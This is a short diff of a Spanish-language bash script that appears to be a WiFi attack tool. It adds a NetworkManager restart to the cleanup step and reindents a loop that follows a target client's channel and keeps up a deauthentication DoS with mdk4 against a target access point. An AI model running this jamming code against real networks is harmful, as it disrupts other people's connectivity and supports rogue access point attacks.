@@ -42,6 +42,7 @@ tput cnorm
 echo;echo -e "${VERDE}[::]${BLANCO} Quitando modo monitor si esta puesto...!"
 monitor quitar &>/dev/null
 echo -e "${VERDE}[::]${BLANCO} Reiniciando NetworkManager..."
+systemctl restart NetworkManager
 for proceso in nodogsplash berate dnsmasq hostapd wpa_supplicant ;do
 	for i in `ps -e | grep $proceso | grep -v grep | awk -F ' ' '{print $1}'`;do
 		echo -e "${VERDE}[::]${BLANCO} Matando PID $i de $proceso."
@@ -341,13 +342,13 @@ do
 	timeout=10
 	canal_nuevo
 	canal=$canal_nuevo
-    echo -e "${AMARILLO}[DoS]${BLANCO}	El cliente esta en el canal${CYAN} ${canal}${BLANCO}. Seguimos el ataque..."
-    echo -e "${AMARILLO}[DoS]${BLANCO}	Reiniciando DoS..."
-    ip a | grep $iface_dos &>/dev/null
-    if [ $? = 0 ];then
+	echo -e "${AMARILLO}[DoS]${BLANCO}	El cliente esta en el canal${CYAN} ${canal}${BLANCO}. Seguimos el ataque..."
+	echo -e "${AMARILLO}[DoS]${BLANCO}	Reiniciando DoS..."
+	ip a | grep $iface_dos &>/dev/null
+	if [ $? = 0 ];then
    		iw dev $iface_dos set channel $canal &>/dev/null
-    else
-    	monitor poner  &>/dev/null
+    	else
+    		monitor poner  &>/dev/null
 	fi
 	if [ $mdk4 = si ];then
 		timeout --preserve-status --foreground $tiempo_mdk4 mdk4 $iface_mon e -t $macap -l &>>${pwd}mdk4
